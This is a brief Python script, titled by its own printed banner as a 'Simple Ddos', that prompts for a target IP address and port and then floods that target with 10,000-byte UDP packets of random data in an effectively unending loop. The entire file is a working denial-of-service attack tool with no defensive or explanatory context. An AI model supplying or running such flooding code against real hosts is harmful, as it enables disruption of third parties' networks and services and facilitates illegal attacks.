import socket
import random

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("Enter target IP address: ")
port = int(input("Enter Target Port: "))


s.connect((ip, port))

print("--Simple Ddos by python --")

for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
